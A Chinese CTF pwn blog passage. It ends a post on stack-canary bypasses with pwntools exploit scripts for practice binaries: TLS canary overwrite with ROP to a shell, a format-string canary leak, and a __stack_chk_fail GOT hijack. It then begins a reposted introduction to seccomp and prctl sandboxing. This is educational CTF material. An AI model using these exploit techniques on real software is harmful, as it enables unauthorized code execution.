<h4 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h4><p>断点在main函数，查看canary的地址，只能发现stack和tls结构体中两个canary的值<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/16.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/16.png"><span class="image-caption">img</span></a><br>再断点到线程函数，搜索canary，会发现tls被初始化了，就是多线程函数在libc上方mmap一段空间用来开辟了一个新的tls结构<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/18.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/18.png"><span class="image-caption">img</span></a><br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/17.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/17.png"><span class="image-caption">img</span></a><br>并且这个tls结构除了canary其他都没有用，这段空间里面的数据都是随便可写的<br>我们可以gdb.attach给canary前的变量断点，然后continue，如果打通了，说明没有遇到断点，即在子线程中canary之前的变量与需要用到的系统调用无关<br>但是需要注意，在canary之前的那几个变量，在正常程序中与系统调用有关，不能直接改写，一般利用数组越界来跳过他们去改写canary<br>i春秋公益CTF_BFnote这题就是利用数组越界跳过它们去改写canary<br>在内存里大概长这样<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/19.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/19.png"><span class="image-caption">img</span></a></p>
<h4 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h4><p>①触发栈溢出，将Canary覆盖为aaaaaaaa，同时使用超长的payload将TLS中的Canary一并覆盖为aaaaaaaa<br>②栈迁移到bss段<br>③ROP</p>
<h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">p</span>=process(<span class="hljs-string">&quot;./bs&quot;</span>)<br><span class="hljs-attribute">libc</span> = ELF(&#x27;/lib/x<span class="hljs-number">86</span>_<span class="hljs-number">64</span>-linux-gnu/libc.so.<span class="hljs-number">6</span>&#x27;)<br><span class="hljs-attribute">context</span>.terminal =<span class="hljs-meta"> [&#x27;terminator&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span><br><br><span class="hljs-attribute">pop_rdi_ret</span> = <span class="hljs-number">0</span>x<span class="hljs-number">400</span>c<span class="hljs-number">03</span><br><span class="hljs-attribute">pop_rsi_r15</span> = <span class="hljs-number">0</span>x<span class="hljs-number">400</span>c<span class="hljs-number">01</span><br><span class="hljs-attribute">read_plt</span>=<span class="hljs-number">0</span>x<span class="hljs-number">4007</span>e<span class="hljs-number">0</span><br><span class="hljs-attribute">puts_got</span>=<span class="hljs-number">0</span>x<span class="hljs-number">601</span>fb<span class="hljs-number">0</span><br><span class="hljs-attribute">put_plt</span>=<span class="hljs-number">0</span>x<span class="hljs-number">4007</span>c<span class="hljs-number">0</span><br><span class="hljs-attribute">buf</span>=<span class="hljs-number">0</span>x<span class="hljs-number">602</span>f<span class="hljs-number">00</span><br><span class="hljs-attribute">leave_ret</span>=<span class="hljs-number">0</span>x<span class="hljs-number">400955</span><br><br><span class="hljs-attribute">payload</span> = p<span class="hljs-number">64</span>(pop_rdi_ret)+p<span class="hljs-number">64</span>(puts_got)+p<span class="hljs-number">64</span>(put_plt)<br><span class="hljs-attribute">payload</span> += p<span class="hljs-number">64</span>(pop_rdi_ret)+p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>)+p<span class="hljs-number">64</span>(pop_rsi_r<span class="hljs-number">15</span>)+p<span class="hljs-number">64</span>(buf+<span class="hljs-number">0</span>x<span class="hljs-number">8</span>)+p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>)+p<span class="hljs-number">64</span>(read_plt)+p<span class="hljs-number">64</span>(leave_ret)<br><br><span class="hljs-attribute">print</span> p.recvuntil(<span class="hljs-string">&quot;How many bytes do you want to send?&quot;</span>)<br><span class="hljs-attribute">p</span>.sendline(str(<span class="hljs-number">6128</span>))<br><span class="hljs-attribute">p</span>.send(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">4112</span>+p<span class="hljs-number">64</span>(buf)+payload+<span class="hljs-string">&quot;a&quot;</span>*(<span class="hljs-number">6128</span>-<span class="hljs-number">4120</span>-len(payload)))<br><br><span class="hljs-attribute">puts_addr</span> = u<span class="hljs-number">64</span>(p.recvuntil(&#x27;\x<span class="hljs-number">7</span>f&#x27;)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,&#x27;\x<span class="hljs-number">00</span>&#x27;))<br><span class="hljs-attribute">libc_base</span> = puts_addr - libc.sym[&#x27;puts&#x27;]<br><span class="hljs-attribute">log</span>.success(<span class="hljs-string">&quot;puts_addr==&gt;&quot;</span> + hex(puts_addr))<br><span class="hljs-attribute">log</span>.success(<span class="hljs-string">&quot;libc_base==&gt;&quot;</span> + hex(libc_base))<br><span class="hljs-attribute">system</span> = libc_base+libc.sym[&#x27;system&#x27;]<br><span class="hljs-attribute">binsh</span> = libc_base+libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>).next()<br><span class="hljs-attribute">log</span>.success(<span class="hljs-string">&quot;system_addr==&gt;&quot;</span> + hex(system))<br><span class="hljs-attribute">log</span>.success(<span class="hljs-string">&quot;binsh==&gt;&quot;</span> + hex(binsh))<br><br><span class="hljs-attribute">p</span>.sendline(p<span class="hljs-number">64</span>(pop_rdi_ret)+p<span class="hljs-number">64</span>(binsh)+p<span class="hljs-number">64</span>(system))<br><span class="hljs-attribute">p</span>.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="格式化字符串leak-canary"><a href="#格式化字符串leak-canary" class="headerlink" title="格式化字符串leak canary"></a>格式化字符串leak canary</h2><p>针对有格式化字符串漏洞的栈溢出程序，利用格式化字符串漏洞可以任意地址读写的特点，泄露出栈上的canary，并填入对应位置，然后利用栈溢出get shell<br>这里我找了一个典型的例题，我们需要计算一下偏移，然后利用%p来泄露canary</p>
<h3 id="例题：ASIS-CTF-Finals-2017-Mary-Morton"><a href="#例题：ASIS-CTF-Finals-2017-Mary-Morton" class="headerlink" title="例题：ASIS-CTF-Finals-2017 Mary_Morton"></a>例题：ASIS-CTF-Finals-2017 Mary_Morton</h3><p>main函数<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/20.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/20.png"><span class="image-caption">img</span></a><br>有选项可以选<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/21.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/21.png"><span class="image-caption">img</span></a><br>选项2有格式化字符串漏洞<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/22.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/22.png"><span class="image-caption">img</span></a><br>选项1有栈溢出漏洞<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/23.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/23.png"><span class="image-caption">img</span></a><br>还有后门<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/24.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/24.png"><span class="image-caption">img</span></a><br>开了canary保护<br>意味着要么溢出去触发canary，要么只能利用一次格式化字符串漏洞读内存<br>我们首先确定到可控输入位于格式化字符串第几个参数<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/25.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/25.png"><span class="image-caption">img</span></a><br>尝试一番可以发现是第6个参数的位置<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/26.png"><img src="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/26.png"><span class="image-caption">img</span></a><br>然后计算出buf和canary之间的距离为0x90-0x8=0x88=136<br>这是个64位程序，8字节为一个单位，136/8=17，那么canary距离格式化字符串函数23（17+6）个参数的距离<br>可以利用%23$p来leak canary<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/27.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/27.png"><span class="image-caption">img</span></a><br>nice<br>接下来就把canary填入rbp-8的位置然后ret2text就彳亍了</p>
<h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">context</span>.log_level = &#x27;debug&#x27;<br><span class="hljs-attribute">p</span> = process(&#x27;./Mary_Morton&#x27;)<br><span class="hljs-attribute">p</span>.recvuntil(&#x27;<span class="hljs-number">3</span>. Exit the battle&#x27;)<br><span class="hljs-attribute">p</span>.sendline(&#x27;<span class="hljs-number">2</span>&#x27;)<br><span class="hljs-attribute">p</span>.sendline(<span class="hljs-string">&quot;%23$p&quot;</span>)<br><span class="hljs-attribute">p</span>.recvuntil(&#x27;<span class="hljs-number">0</span>x&#x27;)<br><span class="hljs-attribute">canary</span> = int(p.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br><span class="hljs-attribute">log</span>.success(<span class="hljs-string">&quot;canary==&gt;&quot;</span> + hex(canary))<br><span class="hljs-attribute">system</span> = <span class="hljs-number">0</span>x<span class="hljs-number">4008</span>DA<br><span class="hljs-attribute">payload</span> = &#x27;a&#x27;*<span class="hljs-number">0</span>x<span class="hljs-number">88</span> + p<span class="hljs-number">64</span>(canary) + p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>xdeadbeef) + p<span class="hljs-number">64</span>(system)<br><span class="hljs-attribute">p</span>.sendline(&#x27;<span class="hljs-number">1</span>&#x27;)<br><span class="hljs-attribute">p</span>.sendline(payload)<br><span class="hljs-attribute">p</span>.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="劫持-stack-chk-fail函数"><a href="#劫持-stack-chk-fail函数" class="headerlink" title="劫持__stack_chk_fail函数"></a>劫持__stack_chk_fail函数</h2><p>改写__stack_chk_fail@got，但前提是必须有一个可以向任意地址写的漏洞，例如说格式化字符串漏洞<br>这个方法适用于只能输入一次的程序，如果说可以利用多次的话就可以像上面一样直接泄露canary了</p>
<h3 id="例题：-BJDCTF-2nd-r2t4"><a href="#例题：-BJDCTF-2nd-r2t4" class="headerlink" title="例题：[BJDCTF 2nd]r2t4"></a>例题：[BJDCTF 2nd]r2t4</h3><p>程序比较简单，分析下<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/28.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/28.png"><span class="image-caption">img</span></a><br>存在溢出存在格式化字符串漏洞有canary<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/29.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/29.png"><span class="image-caption">img</span></a><br>有后门<br>直接改写__stack_chk_fail@got为backdoor<br>这个题限制不多，可以直接用fmtstr_payload模块一把梭<br>当然也可以手动构造<br>但是我还没做手动构造打的（懒🐕</p>
<h4 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h4><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import*<br><span class="hljs-attribute">context</span>.log_level = &#x27;debug&#x27;<br><span class="hljs-attribute">p</span>=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">28676</span>)<br><span class="hljs-comment">#p = process(&quot;./r2t4&quot;)</span><br><span class="hljs-attribute">elf</span> = ELF(<span class="hljs-string">&quot;./r2t4&quot;</span>)<br><span class="hljs-attribute">libc</span> = elf.libc<br><span class="hljs-attribute">stack_check</span> = <span class="hljs-number">0</span>x<span class="hljs-number">601018</span><br><span class="hljs-attribute">flag_addr</span> = <span class="hljs-number">0</span>x<span class="hljs-number">400626</span><br><span class="hljs-attribute">payload</span> = fmtstr_payload(<span class="hljs-number">6</span>,&#123;stack_check:flag_addr&#125;).ljust(<span class="hljs-number">40</span>,&#x27;a&#x27;)<br><span class="hljs-attribute">p</span>.sendline(payload)<br><span class="hljs-attribute">p</span>.interactive()<br></code></pre></td></tr></table></figure>

<p>以上就是我对于canary保护的绕过姿势的总结，可能还有我暂时没有涉及到的，也欢迎师傅们提点我一下，这篇博客也算是多天没学习以来的一个新开端吧<br>文中所有的例题和我做分享时的ppt已经上传<a href="https://github.com/N0vice21/Bypass_canary_demo">github</a></p>
<p>参考链接：<br><a href="https://p1kk.github.io/2019/10/26/canary%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/canary/">https://p1kk.github.io/2019/10/26/canary%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/canary/</a><br><a href="https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/">https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/</a><br><a href="https://ctf-wiki.org/pwn/linux/mitigation/canary/">https://ctf-wiki.org/pwn/linux/mitigation/canary/</a></p>
]]></content>
      <tags>
        <tag>canary</tag>
      </tags>
  </entry>
  <entry>
    <title>初探沙箱———转载</title>
    <url>/2021/04/29/2021-04-29-%E5%88%9D%E6%8E%A2%E6%B2%99%E7%AE%B1%E2%80%94%E2%80%94%E2%80%94%E8%BD%AC%E8%BD%BD/</url>
    <content><![CDATA[<p><strong>z转载自<a href="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/">Tiegu’s Blog</a></strong></p>
<h1 id="沙箱机制初探"><a href="#沙箱机制初探" class="headerlink" title="沙箱机制初探"></a>沙箱机制初探</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前做题遇到过几次关于沙箱的题目，自己都是靠猜或者是去网上找一些零碎的知识去做的，现在刷buu发现一道关于沙箱机制的题目，加之最近觉得没写博客感觉很多知识点忘得很快，所以打算学习一下沙箱机制，顺便写一篇博客去记录一下。</p>
<h2 id="what’s-the-沙箱安全机制"><a href="#what’s-the-沙箱安全机制" class="headerlink" title="what’s the 沙箱安全机制"></a>what’s the 沙箱安全机制</h2><p>在计算机安全领域，沙箱(Sandbox)是一种程序的隔离运行机制，其目的是限制不可信进程或不可信代码运行时的访问权限。沙箱技术经常被用于执行未经测试的或不可信的客户程序。为了阻止不可信程序可能破坏系统程序或破坏其它用户程序的运行，沙箱技术通过为不可信客户程序提供虚拟化的内存、文件系统、网络等资源，而这种虚拟化手段对客户程序来说是透明的。由于沙箱里的资源被虚拟化（或被间接化），所以沙箱里的不可信程序的恶意行为可以被限制在沙箱中，或者在沙箱里只允许执行在白名单里规定的有限的API操作。</p>
<p><strong>看概念感觉沙箱机制是一种安全隔离技术，但是个人感觉目前做pwn题遇到的沙箱机制用到的是对于一些system call的调用的ban，所以以下介绍的不是对这个沙箱机制的深入了解，而是介绍两种常见的沙箱 seccomp 安全机制和 prctl 。</strong></p>
<h2 id="seccomp的探索"><a href="#seccomp的探索" class="headerlink" title="seccomp的探索"></a><code>seccomp</code>的探索</h2><h3 id="What-is-seccomp"><a href="#What-is-seccomp" class="headerlink" title="What is seccomp"></a>What is seccomp</h3><p>seccomp (short for secure computing mode) is a computer security facility in the Linux kernel. It was merged into the Linux kernel mainline in kernel version 2.6.12, which was released on March 8, 2005. seccomp allows a process to make a one-way transition into a “secure” state where it cannot make any system calls except exit(), sigreturn(), read() and write() to already-open file descriptors. Should it attempt any other system calls, the kernel will terminate the process with SIGKILL or SIGSYS. In this sense, it does not virtualize the system’s resources but isolates the process from them entirely.</p>
<h3 id="How-to-use"><a href="#How-to-use" class="headerlink" title="How to use"></a>How to use</h3><p>这里主要介绍几个函数以及利用。</p>
<p><strong><a href="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/1.png"><img src="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/1.png"><span class="image-caption">img</span></a></strong></p>
<p><code>ctx</code>是<code>Filter context/handle</code>,其中<code>typedef void *scmp_filter_ctx;</code><br><code>seccomp_init</code>是初始化的过滤状态,这里用的是<code>SCMP_ACT_ALLOW</code>,表示默认允许所有的syscacll.如果初始化状态为<code>SCMP_ACT_KILL</code>,则表示默认不允许所有的syscall （详见下图）</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * seccomp actions</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Kill the process</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_ACT_KILL		0x00000000U</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Throw a SIGSYS signal</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_ACT_TRAP		0x00030000U</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Return the specified error code</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_ACT_ERRNO(x)	(0x00050000U | ((x) &amp; 0x0000ffffU))</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Notify a tracing process with the specified value</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_ACT_TRACE(x)	(0x7ff00000U | ((x) &amp; 0x0000ffffU))</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Allow the syscall to be executed after the action has been logged</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_ACT_LOG		0x7ffc0000U</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Allow the syscall to be executed</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_ACT_ALLOW		0x7fff0000U</span><br></code></pre></td></tr></table></figure>

<p><code>seccomp_rule_add</code>是添加一条规则,函数原形如下</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> seccomp<span class="hljs-constructor">_rule_add(<span class="hljs-params">scmp_filter_ctx</span> <span class="hljs-params">ctx</span>, <span class="hljs-params">uint32_t</span> <span class="hljs-params">action</span>, <span class="hljs-params">int</span> <span class="hljs-params">syscall</span>, <span class="hljs-params">unsigned</span> <span class="hljs-params">int</span> <span class="hljs-params">arg_cnt</span>, <span class="hljs-operator">...</span>)</span>;<br></code></pre></td></tr></table></figure>

<p><code>seccomp_load</code>是应用过滤,如果不调用<code>seccomp_load</code>则上面所有的过滤都不会生效</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> seccomp<span class="hljs-constructor">_load(<span class="hljs-params">const</span> <span class="hljs-params">scmp_filter_ctx</span> <span class="hljs-params">ctx</span>)</span>;<br></code></pre></td></tr></table></figure>

<p>有一点需要再说一下,我们用的是<code>seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);</code>,<code>arg_cnt</code>为0,表示我们直接限制execve,不管他什么参数.</p>
<p>如果<code>arg_cnt</code>不为0,那<code>arg_cnt</code>表示后面限制的参数的个数,也就是只有调用execve,且参数满足要求时,才会拦截syscall.（参数详情参见下图）</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Specify an argument comparison struct for use in declaring rules</span><br><span class="hljs-comment"> * @param arg the argument number, starting at 0</span><br><span class="hljs-comment"> * @param op the comparison operator, e.g. SCMP_CMP_*</span><br><span class="hljs-comment"> * @param datum_a dependent on comparison</span><br><span class="hljs-comment"> * @param datum_b dependent on comparison, optional</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_CMP(...)		((struct scmp_arg_cmp)&#123;__VA_ARGS__&#125;)</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Specify an argument comparison struct for argument 0</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_A0(...)		SCMP_CMP(0, __VA_ARGS__)</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Specify an argument comparison struct for argument 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_A1(...)		SCMP_CMP(1, __VA_ARGS__)</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Specify an argument comparison struct for argument 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_A2(...)		SCMP_CMP(2, __VA_ARGS__)</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Specify an argument comparison struct for argument 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_A3(...)		SCMP_CMP(3, __VA_ARGS__)</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Specify an argument comparison struct for argument 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_A4(...)		SCMP_CMP(4, __VA_ARGS__)</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Specify an argument comparison struct for argument 5</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_A5(...)		SCMP_CMP(5, __VA_ARGS__)</span><br><br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Comparison operators</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">scmp_compare</span> &#123;</span><br>	_SCMP_CMP_MIN = <span class="hljs-number">0</span>,<br>	SCMP_CMP_NE = <span class="hljs-number">1</span>,		<span class="hljs-comment">/**&lt; not equal */</span><br>	SCMP_CMP_LT = <span class="hljs-number">2</span>,		<span class="hljs-comment">/**&lt; less than */</span><br>	SCMP_CMP_LE = <span class="hljs-number">3</span>,		<span class="hljs-comment">/**&lt; less than or equal */</span><br>	SCMP_CMP_EQ = <span class="hljs-number">4</span>,		<span class="hljs-comment">/**&lt; equal */</span><br>	SCMP_CMP_GE = <span class="hljs-number">5</span>,		<span class="hljs-comment">/**&lt; greater than or equal */</span><br>	SCMP_CMP_GT = <span class="hljs-number">6</span>,		<span class="hljs-comment">/**&lt; greater than */</span><br>	SCMP_CMP_MASKED_EQ = <span class="hljs-number">7</span>,		<span class="hljs-comment">/**&lt; masked equality */</span><br>	_SCMP_CMP_MAX,<br>&#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Argument datum</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint64_t</span> <span class="hljs-keyword">scmp_datum_t</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Argument / Value comparison definition</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">scmp_arg_cmp</span> &#123;</span><br>	<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> arg;	<span class="hljs-comment">/**&lt; argument number, starting at 0 */</span><br>	<span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">scmp_compare</span> <span class="hljs-title">op</span>;</span>	<span class="hljs-comment">/**&lt; the comparison op, e.g. SCMP_CMP_* */</span><br>	<span class="hljs-keyword">scmp_datum_t</span> datum_a;<br>	<span class="hljs-keyword">scmp_datum_t</span> datum_b;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>举个例子：</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/seccomp.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;<br>	scmp_filter_ctx ctx;<br>	ctx = <span class="hljs-built_in">seccomp_init</span>(SCMP_ACT_ALLOW);<br>	<span class="hljs-built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_KILL,         <span class="hljs-built_in">SCMP_SYS</span>(write),<span class="hljs-number">1</span>,<span class="hljs-built_in">SCMP_A2</span>(SCMP_CMP_EQ,<span class="hljs-number">0x10</span>));<span class="hljs-comment">//第2(从0)个参数等于0x10</span><br>	<span class="hljs-built_in">seccomp_load</span>(ctx);<br>	<span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;i will give you a shell\n&quot;</span>,<span class="hljs-number">24</span>);<span class="hljs-comment">//不被拦截</span><br>	<span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;1234567812345678&quot;</span>,<span class="hljs-number">0x10</span>);<span class="hljs-comment">//被拦截</span><br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="prctl-函数"><a href="#prctl-函数" class="headerlink" title="prctl 函数"></a>prctl 函数</h2><p>查看函数原型：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">prctl</span><span class="hljs-params">(<span class="hljs-keyword">int</span> option, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg2, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg3,<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg4,<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg5)</span></span>;<br></code></pre></td></tr></table></figure>

<p>第一个参数是指定相应的操作，在手册上有特别多的选项，这里打算介绍两个。</p>
<h3 id="PR-SET-NO-NEW-PRIVS-用38表示"><a href="#PR-SET-NO-NEW-PRIVS-用38表示" class="headerlink" title="PR_SET_NO_NEW_PRIVS(用38表示)"></a>PR_SET_NO_NEW_PRIVS(用38表示)</h3><p>简单的说就是如果 option 设置为 <code>PR_SET_NO_NEW_PRIVS</code> 的话，第二个参数如果设置为 1 的话，<strong>不能够进行 execve 的系统调用，同时这个选项还会继承给子进程</strong>。</p>
<p>这样的话常规的调用 system 函数、one_gadget 的用不了了，这里的设置点其实和 <strong>pwnable.tw 上 orw 那道题一样，只能进行几个系统调用：open、write、read</strong>。</p>
